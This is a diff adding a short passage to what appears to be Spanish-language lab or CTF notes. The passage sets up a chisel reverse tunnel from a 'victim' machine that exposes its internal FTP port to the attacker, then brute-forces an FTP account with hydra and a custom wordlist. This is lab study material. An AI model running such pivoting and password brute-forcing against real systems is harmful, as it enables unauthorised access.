@@ -250,6 +250,22 @@ UNa vez esto inicamos el servidor (que estara en nuestra maquina):
 
 ![[Pasted image 20260824204110.png]]
 
+y desde la maquina victima, inciiamos el modo cliente:
+
+```
+./chisel_1.9.1_linux_amd64 client 192.168.11.111:6000 R:2121:127.0.0.1:21
+```
+
+![[Pasted image 20260824204239.png]]
+
+AHora en el puerto 2121 de mi ordenador, dle ordenador atacante se redirigirá las peticiones al puerto 21 de la victima y todo por el puerto 6000. Hacer un mini esquema si se puede . 
+
+Y ahora intentamos hydra con el comando:
+
+```
+hydra -l i.cassini -P irene_wordlist.txt ftp://127.0.0.1 -s 2121 -t 4 -f -vV
+```
+
 
 
 
